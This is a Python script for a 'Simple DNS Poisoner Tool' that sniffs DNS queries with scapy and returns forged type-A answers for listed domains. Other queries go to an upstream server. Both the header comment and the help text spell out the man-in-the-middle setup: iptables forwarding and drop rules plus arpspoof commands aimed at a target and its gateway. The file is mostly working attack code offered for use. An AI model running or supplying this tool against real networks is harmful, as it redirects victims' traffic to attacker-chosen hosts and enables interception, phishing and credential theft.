#! /usr/bin/env python
#
# SDPT (Simple DNS Poisoner Tool) sniffes for DNS queries going through your attacker host
# and provides fake answers to the specified DNS type A queries. It also forward other queries
# different than type A and those pointing to FQDN that are not specifically included within the
# fake list.
#
# * For all use cases, you may want to adjust the values of the fake_hosts_dic dictionary
#   to include all the FQDN you want to spoof.
#
# USAGE:
#
#   In a <target>---<attacker>---<gateway>---<DNS> scenario, make sure to:
#       1. iptables -F; iptables -t nat -F
#       2. echo '1' > /proc/sys/net/ipv4/ip_forward
#       3. iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
#       4. iptables -A FORWARD -s <target> -p udp -d <upstream_dns> --dport 53 -j DROP
#       5. arpspoof -i eth0 -t <target> -r <default_gateway>
#
#       With 4. we will prevent the DNS queries, sent by the target, from going directly to the
#       upstream DNS server.
#
#   In a <target>---<attacker>---<DNS> scenario, make sure to:
#       1. echo '0' > /proc/sys/net/ipv4/ip_forward
#       2. arpspoof -i eth0 -t <target> <upstream_dns>
#

import argparse
from threading import Thread
from Queue import Queue, Empty
from scapy.all import *
import socket
import sys
import traceback

fake_hosts_dic = {}
target_iface = ""
sniffer_filter = ""
upstream_dns_server = ""
attacker_ip = ""

def sniffer(buffer, target_iface, a_filter):
    sniff(iface=target_iface, filter=a_filter, prn=lambda pkt:buffer.put(pkt))

def main_loop():
    # Thread-safe queue of DNS packets
    buffer = Queue()
    # Create a thread for the sniffer to run continuously...
    sniffer_thread = Thread(target=sniffer, args=(buffer, target_iface, sniffer_filter,))
    sniffer_thread.daemon = True
    print "[*] Starting sniffer... "
    sniffer_thread.start()

    # Look at every packet on the queue...
    while True:
        try:
            # Get the next packet from the buffer...
            pkt = buffer.get(timeout=1)

            # Take some parameters...
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            udp = UDP(dport=pkt[UDP].sport, sport=53)

            # If not a DNS query, ignore it...
            if pkt[DNS].opcode != 0 or pkt[DNS].qr == 1:
                continue

            # If not a DNS query type A, check if we should forward the query...
            if dnsqtypes[pkt[DNS][DNSQR].qtype] != 'A':
                answer = forward_request(str(pkt[DNS]))
                dns = DNS(answer)
                spoofed_resp = ip/udp/dns
                print "[*] Sending answer from upstream DNS server ..."
                send(spoofed_resp, verbose=0)
                continue

            q_host = pkt[DNS][DNSQR].qname.decode('ascii')
            print "[*] Got a dns query packet type A asking for '" + q_host + "' ..."

            # If it has to be faked, we create the answer from scratch...
            if fake_hosts_dic.has_key(q_host):
                print "    [+] We DO have to poison the response... :)"
                fake_ip = fake_hosts_dic[q_host]
                # Take the original Questions section
                dns_qr = pkt[DNS].qd
                # Build the Answers section
                dns_rr = DNSRR(rrname=q_host, type='A', rdata=fake_ip, ttl=1234)
                # Build the DNS answer payload
                dns = DNS(id=pkt[DNS].id, ancount=1, qr=1, qd=dns_qr, an=dns_rr)
                                # Build the IP answer
                spoofed_resp = ip/udp/dns

                print "    [*] Sending a fake response (" + fake_ip + ") ..."
                send(spoofed_resp, verbose=0)
            else:
                # Forward the query to the upstream DNS server
                answer = forward_request(str(pkt[DNS]))
                dns = DNS(answer)
                spoofed_resp = ip/udp/dns
                print "[*] Sending answer from upstream DNS server ..."
                send(spoofed_resp, verbose=0)

        except Empty:
            pass


def forward_request(dns_payload):
    print("[*] Sending DNS request to upstream DNS server " + upstream_dns_server)
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_socket.sendto(dns_payload, (upstream_dns_server, 53))
    response, address = udp_socket.recvfrom(1024)
    return response


if __name__ == "__main__":
    epilog_help = """
MiTM HELP:
    In a <target>---<attacker>---<gateway>---<DNS> scenario, make sure to:
        1. iptables -F; iptables -t nat -F
        2. echo '1' > /proc/sys/net/ipv4/ip_forward
        3. iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
        4. iptables -A FORWARD -s <target> -p udp -d <upstream_dns> --dport 53 -j DROP
        5. arpspoof -i eth0 -t <target> -r <default_gateway>

        With 4. we will prevent the DNS queries, sent by the target, from going directly to the
        upstream DNS server.

    In a <target>---<attacker>---<DNS> scenario, make sure to:
        1. echo '0' > /proc/sys/net/ipv4/ip_forward
        2. arpspoof -i eth0 -t <target> <upstream_dns>

"""
    # Main Arguments
    parser = argparse.ArgumentParser(description="Simple DNS Poisoner/Server", epilog=epilog_help,
                                     formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-i', '--iface', required=True, dest="iface", type=str, help="the interface where to sniff/listen")
    parser.add_argument('--up-dns', required=True, dest="upstream_dns_server", type=str, help="the upstream DNS server to forward queries")
    parser.add_argument('--attacker_ip', required=True, dest="attacker_ip", type=str, help="the attacker IP to filter out from sniffer")

    args = parser.parse_args()

    upstream_dns_server = args.upstream_dns_server
    attacker_ip = args.attacker_ip
    sniffer_filter = "udp port 53 and not host " + attacker_ip
    target_iface = args.iface

    # Dictionary of FQDN to be faked
    fake_hosts_dic["www.google.com"] = "1.1.1.1"
    fake_hosts_dic["www.google.com."] = "1.1.1.1"

    print "[*] FORWARD DNS REQUESTS TO: " + upstream_dns_server
    print "[*] SNIFFING ON INTERFACE: " + target_iface
    print "-" * 50
    print "[*] Starting DNS poisoner ..."
    main_loop()
